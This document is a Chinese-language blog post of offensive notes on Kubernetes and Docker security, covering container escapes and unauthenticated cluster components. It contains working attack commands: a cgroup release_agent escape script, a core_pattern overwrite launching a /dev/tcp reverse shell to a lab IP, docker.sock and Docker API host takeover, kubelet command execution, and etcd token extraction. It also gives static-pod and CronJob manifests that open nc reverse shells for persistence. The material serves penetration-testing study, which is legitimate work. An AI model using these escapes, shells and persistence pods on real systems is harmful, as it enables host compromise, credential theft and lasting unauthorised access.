---
layout: article
title: Kubernetes及Docker容器安全
mathjax: true
key: a00037
cover: /bkgs/3.jpg
modify_date: 2022-6-25
show_author_profile: true
excerpt_type: html
tag: 
- Kubernetes
- docker
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

最近看到一篇Kubernetes安全的好文，抽空补了一下这块的知识，再结合了一点之前Docker安全的笔记，就有了这篇，由于k8s pod跑的基本都是docker，因此不会特别去区分某种手法使用场景，除了一些k8s上层特有的配置安全问题，其他攻击点基本都是通用的。

<!--more-->

简单来说，容器这一块的攻击方式主要有三种

- 通用CVE，比如内核漏洞或组件漏洞
- 容器配置导致的安全问题，如不安全的挂载，容器权限的设置
- 上层编排组件的配置问题，比如K8s各种鉴权问题

# 通用CVE

第一类较为简单粗暴，攻击角度上通常拿着EXP对照着版本直接打就行，防御通常也只需要简单的升级即可，平时多留意安全动态和官方通告，收集EXP以及修复措施；这块就暂不做过多的讨论，这次主要想多讨论一下后两类。

# 容器逃逸

因为容器配置导致的各种问题最终都可以收束到容器逃逸上，毕竟容器的价值以及容器的操作空间都远不如宿主机，从渗透的角度讲，拿到容器宿主机的权限可以更好的收集内网信息以及横向移动。

逃逸手法的隐蔽性从上到下依次增加：

1. mount /etc + write crontab
2. mount /root/.ssh + write authorized_keys
3. old CVE/vulnerability exploit
4. write cgroup notify_on_release
5. write procfs core_pattern
6. volumeMounts: / + chroot
7. remount and rewrite cgroup
8. create ptrace cap container
9. websocket/sock shell + volumeMounts: /path

## 挂载设备

**极易触发告警**

挂载设备读写宿主机文件是特权容器最常见的逃逸方式之一。

```bash
# --privileged 能赋予root权限
sudo docker run -it --privileged vulhub/confluence:7.13.6 /bin/bash
(容器随便复用了一下之前的)
```

然后查找宿主机设备，并且挂载

```bash
fdisk -l 
mount /dev/sda1 /tmp/mkdir
```

之后就相当于宿主机root用户，可以任意读写文件，写公钥，写Crontab （`tail -f /var/log/syslog` 查看系统日志）等等都可以。

## lxcfs攻击

lxcfs 提供容器中的资源可见性，是一个开源的FUSE（用户态文件系统）实现来支持LXC容器，它也可以支持Docker容器

LXCFS通过用户态文件系统，在容器中提供下列 procfs 的文件：

/proc/cpuinfo
/proc/diskstats
/proc/meminfo
/proc/stat
/proc/swaps
/proc/uptime

判断是否使用lxcfs：`	cat /proc/1/mountinfo`

```bash
#docker 启动
sudo docker run -it -v /var/lib/lxcfs/:/data/test/lxcfs:rw vulhub/confluence:7.13.6 /bin/bash

#k8s pod
apiVersion: v1
kind: Pod
metadata:
  name: lxcfs-rw
spec:
  containers:
  - name: lxcfs-rw-5
    image: nginx
    command: ["sleep"]
    args: ["infinity"]
    imagePullPolicy: IfNotPresent
    volumeMounts:
      - mountPath: /data
        mountPropagation: HostToContainer
        name: test-data
  volumes:
  - name: test-data
    hostPath:
      path: /data
      type: ""
```

然后在容器执行`lxcfs /data/test/lxcfs/`修改data 目录下的权限

此时容器内会出现一个新的虚拟路径，并且会绑定当前容器的 devices subsystem cgroup 进入容器内，且在容器内有权限对该 devices subsystem 进行修改。

一路cd下去到`devices.allow`文件

`echo a > devices.allow` 可以修改当前容器的设备访问权限，致使我们在容器内可以访问所有类型的设备

由CVE-2020-8557这个具有 Kubernetes 特色的拒绝服务漏洞可知，`/etc/hosts`，` /dev/termination-log`，`/etc/resolv.conf`， `/etc/hostname` 这四个容器内文件是由默认从宿主机挂载进容器的，所以在他们的挂载信息内很容易能获取到主设备号 ID

```bash
cat /proc/self/mountinfo | grep etc/
```

使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限。

```
mknod mknod_near b 8 3
debugfs -w mknod_near
```

即使没有安装和使用 lxcfs，当容器为 privileged、sys_admin 等特殊配置时，可以使用相同的手法进行逃逸

(在容器内 CAPABILITIES sys_admin 其实是 privileged 的子集)

工具：https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw

## 创建 cgroup

另外一个比较出名的手法就是利用 cgroup release_agent 进行容器逃逸以在宿主机执行命令，这个手法同样可以作用于 sys_admin 的容器

利用脚本参考https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh

```bash
#!/bin/bash

set -uex

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

sleep 2
cat "/output"
```

```bash
#从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
```

上述做法经常在不同的 Docker 容器逃逸 EXP 被使用到；如果我们在漏洞利用过程中，需要在容器和宿主机内进行文件或文本共享，这种方式是非常棒且非常通用的一个做法。

其思路在于利用 Docker 容器镜像分层的文件存储结构 (Union FS)，从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径；则对该路径下的文件操作等同于对容器根目录的文件操作。

另外一个比较小众方法是借助上面 lxcfs 的思路，复用到 sys_admin 或特权容器的场景上读写母机上的文件

首先还是需要先创建一个 cgroup 但是这次是 device subsystem 的

```bash
mkdir /tmp/dev
mount -t cgroup -o devices devices /tmp/dev/
```

修改当前已控容器 cgroup 的 devices.allow，此时容器内已经可以访问所有类型的设备

```bash
echo a > /tmp/dev/docker/b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57/devices.allow
```

使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限。

```bash
mknod near b 252 1
debugfs -w near
```

## 特殊路径挂载

比如/, /etc/, /root/.ssh 等敏感路径，执行类似命令 

```bash
docker run -it -v /:/tmp/rootfs ubuntu bash
```

### Docker in Docker

 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器

场景：存在于 Serverless 的前置公共容器内，或者存在于每个节点的日志容器内

可以用类似下述的命令创建一个通往母机的 shell。

```bash
./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
```

### 攻击挂载了/proc的容器

创建一个具有该配置的容器并获得其 shell：

```bash
sudo docker run -v /proc:/host_proc --rm -it vulhub/confluence:7.13.6 bash

#找宿主机内对应当前容器内部文件结构的路径
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
```

因为宿主机内的 /proc 文件被挂载到了容器内的 /host_proc 目录，所以我们修改 /host_proc/sys/kernel/core_pattern 文件以达到修改宿主机 /proc/sys/kernel/core_pattern 的目的

```bash
echo -e "|/var/lib/docker/overlay2/b98243e88aa59207f1f350fbd9e837bc095fe159a173a63f5a38597ae9dac26d/diff/flag.sh \rcore "> /host_proc/sys/kernel/core_pattern

#	Exp内容

#!/bin/bash
bash -i >& /dev/tcp/172.16.144.131/2335 0>&1

```

此时我们还需要一个程序在容器里执行并触发 segmentation fault 使植入的 payload 即 exp.sh 在宿主机执行

```c
	#include <stdio.h>
	int main(void)
	{
	    int *a = NULL;
	    *a = 1;
	    return 0;
	}
```

当容器内的 segmentation fault 被触发时，我们就达到了逃逸到宿主机在容器外执行任意代码的目的

## SYS_PTRACE

条件：SYS_PTRACE capabilities 权限赋予容器

`--cap-add=SYS_PTRACE `，或 Kubernetes PODS 设置 `securityContext.capabilities `为 `SYS_PTRACE`

```bash
sudo docker run  --cap-add=SYS_PTRACE -it vulhub/confluence:7.13.6 bash

#yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx
spec:
  shareProcessNamespace: true
  containers:
  - name: nginx
    image: nginx
  - name: shell
    image: busybox:1.28
    securityContext:
      capabilities:
        add:
        - SYS_PTRACE
    stdin: true
    tty: true
```

判断是否使用

```bash
capsh --print 
```

利用就是进程注入，拥有了该权限就可以在容器内执行 strace 和 ptrace 等工具

## Service Account

使用 Kubernetes 做容器编排的话，在 POD 启动时，Kubernetes 会默认为容器挂载一个 Service Account 证书。同时，默认情况下 Kubernetes 会创建一个特有的 Service 用来指向 ApiServer。

默认情况下，这个 Service Account 的证书和 token 虽然可以用于和 Kubernetes Default Service 的 APIServer 通信，但是是没有权限进行利用的。 

但是集群管理员可以为 Service Account 赋予权限，直接在容器里执行 kubectl 就可以集群管理员权限管理容器集群

因此获取一个拥有绑定了 ClusterRole/cluster-admin Service Account 的 POD，其实就等于拥有了集群管理员的权限。

## CVE-2020-15257

此前 containerd 修复了一个逃逸漏洞，当容器和宿主机共享一个 net namespace 时（如使用 --net=host 或者 Kubernetes 设置 pod container 的 .spec.hostNetwork 为 true）攻击者可对拥有特权的 containerd shim API 进行操作，可能导致容器逃逸获取主机权限、修改主机文件等危害。

**不要把host的namespace共享给容器**

```
sudo docker run  --net=host -it vulhub/confluence:7.13.6 bash
```

https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn

## runc CVE-2019-5736

已经打烂了

 POC参考：

github.com/feexd/pocs

github.com/twistlock/RunC-CVE-2019-5736

github.com/AbsoZed/DockerPwn.py

github.com/q3k/cve-2019-5736-poc

## StaticPod

一种特殊的 Pod，由节点上 kubelet 进行管理，仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用。优点如下：

配置目录固定，/etc/kubernetes/manifests 或 /etc/kubelet.d/

执行间隔比 Cron 更短（每20s监控一次且不会重复调用）

进程配置更灵活，可以运行任意配置的容器

检测新文件或文件变化的逻辑更通用，痕迹清理只需删除 Static Pod YAML 文件即可，kubelet 会自动移除关闭运行的恶意容器。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: static-web
  labels:
    role: myrole
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
          command:
          - /bin/sh
          - -c
          - nc 172.16.144.131 3333 -e /bin/sh
```



# 配置不当或未鉴权

默认来讲这些问题其实都不应该出现，一些曾经的问题在较高版本都已经修复了，如果出现问题，一般都是因为调试或者偷懒打开了权限而造成的入侵。

| **kube-apiserver:**      | **6443, 8080**         |
| ------------------------ | ---------------------- |
| **kubectl proxy:**       | **8080, 8081**         |
| **kubelet:**             | **10250, 10255, 4149** |
| **dashboard:**           | **30000**              |
| **docker api:**          | **2375**               |
| **etcd:**                | **2379, 2380**         |
| kube-controller-manager: | 10252                  |
| kube-proxy:              | 10256, 31442           |
| kube-scheduler:          | 10251                  |
| weave:                   | 6781, 6782, 6783       |
| kubeflow-dashboard:      | 8080                   |

## apiserver

需要下kubectl

```
curl -LO "https://dl.Kubernetes.io/release/$(curl -L -s https://dl.Kubernetes.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

一个6443和一个8080，前者会进行鉴权，后者不会

一般都有鉴权，/etc/kubernetes/manifests

默认`--insecure-port=0 `甚至删除字段

要开启未鉴权的话加上

```
- --insecure-port=8080
- --insecure-bind-address=0.0.0.0

systemctl restart kubelet
```

远程利用

`kubectl -s ip:8080 get node`

对于针对 Kubernetes 集群的攻击来说，获取 admin kubeconfig 和 apiserver 所在的 master node 权限基本上就是获取主机权限路程的终点。 

至于如何通过 apiserver 进行持续渗透和控制，参考 kubectl 的官方文档是最好的：

[https://Kubernetes.io/docs/reference/generated/kubectl/kubectl-commands](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands)

## kubelet

kubelet存在于每一个node中，端口10250，kubelet 与 apiserver 进行通信的主要端口，kubelet通过该端口能知道自己该处理的任务，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用 10250 提供的能力

开启匿名请求

```
/var/lib/kubelet/config.yml
	
authentication:
	anonymous:
	  enabled: true
	webhook:
	  cacheTTL: 0s
	  enabled: true
 x509:
	  clientCAFile: /etc/kubernetes/pki/ca.crt
 authorization:
	  mode: AlwaysAllow
	
	
systemctl restart kubelet
```

然后在攻击机器执行如下进行攻击

```
#获取pod信息
https://172.16.144.130:10250/pods
# 路径为metadata:name,namespace,spec:container:name
curl https://172.16.144.130:10250/run/kube-system/kube-proxy-fmjrk/kube-proxy -k -d "cmd=cat /etc/passwd"
```

可以根据容器逃逸知识,比如`securityContext`、`volumes`，快速过滤出相应的 高权限可逃逸POD 进行控制

## dashboard

感觉比较鸡肋

在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard，

但此时登陆用的账户是Kubernetes-dashboard 这个 ServiceAccount，默认是没有操作集群的权限的（k8s用的RBAC，cluster-admin权限最高）

但有些开发者为了方便或者在测试环境中会为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）。

## etcd

端口2379，可以获取 Kubernetes 的认证鉴权 token 用于控制集群，攻击机器需要安装etcd

/etc/Kubernetes/manifests/etcd.yaml 

相关配置

```
#是否证书校验
--client-cert-auth

#0.0.0.0
listen-client-urls
```

如果有证书的话

```
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt 
export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt 
export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
```

 先读取用来访问 apiserver 的 token

```
./etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=true "/" | grep /secrets/kube-system/clusterrole
./etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-fltzp 
```

利用 token 我们可以通过 apiserver 端口 6443 控制集群：

如 

```
kubectl  --insecure-skip-tls-verify -s https://xx:6443 --token="xx" get ns -o wide
```

## docker remote api

**发现之前调试Java的时候自己打开了，可怕**

Docker Engine API 是 Docker 提供的基于 HTTP 协议的用于 Docker 客户端与 Docker 守护进程交互的 API，Docker daemon 接收来自 Docker Engine API 的请求并处理，Docker daemon 默认监听 2375 端口且未鉴权，我们可以利用 API 来完成 Docker 客户端能做的所有事情。

Docker daemon 支持的socket 有 unix、tcp、fd。

默认监听 unix:///var/run/docker.sock

打开tcp socket的方法很多，比如修改Docker配置文件如 `/usr/lib/systemd/system/docker.service`

之后依次执行 `systemctl daemon-reload`、`systemctl restart docker` 便可以使用 `docker -H tcp://[HOST]:2375 【加上命令】`这种方式控制目标 docker

考虑突破调试端口

判断，看是否含有 ContainersRunning、DockerRootDir 等关键字

```
curl 172.16.144.130:9527/info

#然后就可以执行了
docker -H tcp://172.16.144.130:9527 ps
docker -H tcp://172.16.144.130:9527 run  -it vulhub/confluence:7.13.6 bash
```

因此，能访问Docker API ，就能创建特权容器，并且挂载主机目录，渗透主机

## kubectl proxy

外网想访问pod端口而不配置nodeport这些的话，可以考虑proxy，`Kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0`

kubectl proxy 转发的是 apiserver 所有的能力，而且是默认不鉴权的，所以 --address=0.0.0.0 就是极其危险的了,这个和APIServer 类似

配置

```
#开启
kubectl proxy --accept-hosts=^.*$ --address=0.0.0.0

#远程攻击
kubectl -s http://172.16.144.130:8001/ get pod
```

# 其他问题

这些问题就当作攻击面拓展和了解吧

## 容器镜像安全问题

容器镜像的安全扫描能力较运行时安全比较成熟一些

`~/.docker/config.json`文件内就可能存有镜像仓库账号和密码信息

很多 POD 和线上容器在使用镜像时，可能用 latest 或默认没有指定版本，所以劫持镜像源之后只要在原本的 latest 之上植入恶意代码并 push 新的版本镜像，就可以在获取镜像权限之后进而获取线上的容器权限。

## 二次开发所产生的安全问题

比如对 Kubernetes API 的请求转发或拼接，这个更像是常规web上的安全问题

不管形式如何，本质都是对APIServer交互，破坏程序原本想对 APIServer 所表达的语义，注入或修改 Rest API 请求里所要表达的信息，就可以达到意想不到的效果。

## Serverless

题外话：Serverless 还有一个比较大漏洞挖掘的方向是资源占用，例如驻留进程，驻留文件，进程偷跑，句柄耗尽等条件竞争漏洞，用于影响多租户集群，占用计算资源等

### 文件驻留导致命令执行

很多时候Serverless周期结束后的策略是删除服务器文件，但是复用环境，可能会导致多个用户的应用会存在多个用户在不同时间段使用一个容器环境的情况，在安全性上是比较难得到保障的

 

比如：rm -rf /tmp，在tmp下建目录--help就能规避掉删除，但是生命周期一般都很短，重点关注

新的代码

代码内部配置

环境变量

秘钥、证书、密码信息等

### 攻击公用容器 / 镜像

在不同的 Serverless 架构中，都有多类持久化且公用的容器以实现程序调度、代码预编译、代码下载运行等逻辑。

这类容器一般拥有获取所有用户代码、配置和环境变量的能力，同时也比较容易出现 Docker IN Docker 或大权限 Service Account 的设计。

场景：

1.下载源代码时，使用 git clone 进行命令拼接，导致存在命令注入

2.在安装 node.js 依赖包时，构造特殊的 package.json 利用 preinstall 控制公用容器。

3.配置指向恶意第三方仓库的 pip requirements.txt，利用恶意 pip 包获取依赖打包容器的权限，同类的利用手法还可以作用于 nodejs、ruby 等语言的包管理器

4.因为容器镜像里的打了低版本 git、go 等程序，在执行 git clone,  git submodule update(CVE-2019-19604), go get 时所导致的命令执行，

CVE-2018-6574 的 POC 可参考：

 https://github.com/neargle/CVE-2018-6574-POC/blob/master/main.go

## CronJob 持久化

略显鸡肋

不过实际对抗过程中，虽然我们也会对恶意的 POD 和容器做一定的持久化，但是直接使用 CronJob 的概率却不高。在创建后门 POD 的时候，直接使用 restartPolicy: Always 就可以方便优雅的进行后门进程的重启和维持，所以对 CronJob 的需求反而没那么高。

例子：

```yaml
	apiVersion: batch/v1
	kind: CronJob
	metadata:
	  name: reverseshell
	spec:
	  schedule: "*/1 * * * *"
	  jobTemplate:
	    spec:
	      template:
	        spec:
	          restartPolicy: OnFailure
	          containers:
	            - name: reverse-shell
	              image: busybox
	              securityContext:
	                privileged: true
	              imagePullPolicy: IfNotPresent
	              args:
	              - /bin/sh
	              - -c
              - nc 172.16.144.131 2334 -e /bin/sh
```

# 小结

k8s安全这块说大也大，零零碎碎十好几条，而且也不只这些，但说小也小，归根结底就两三类。以前从使用和二次开发的层面上学习过两次，这次算是比较全面系统的从安全侧认识了一遍k8s，之后有时间再整体的去看看吧。实践的过程中没有刻意的去找合适的版本（包括系统，k8s本身等），但上述的手法依然有大部分能够很轻易的复现。

可以看出，随着组件的不断集成，开发和部署从最开始的一切靠自己，然后出现IaaS，再到现在的SaaS，对于使用者来说能够越来越轻松的上手并且能站在平台的基础上简单整合就能推出成熟的产品和解决方案，但这种“空中楼阁”式的环境也会让开发和运维人员在使用的工程中越来越不知其所以然，于是各种因缺乏知识或无力了解全局而造成的”人为“安全问题层出不穷，即便是头部的服务商也不能幸免于难。在云服务的时代里，我们作为开发者和维护者在享受便捷的同时也应该低头看看，不要闹出“Don't Look Up”式的笑话。

# 参考

https://github.com/neargle/my-re0-k8s-security

https://github.com/cdk-team/CDK

https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan

https://cloud.tencent.com/developer/article/2000490

https://copyfuture.com/blogs-details/20210616193408465N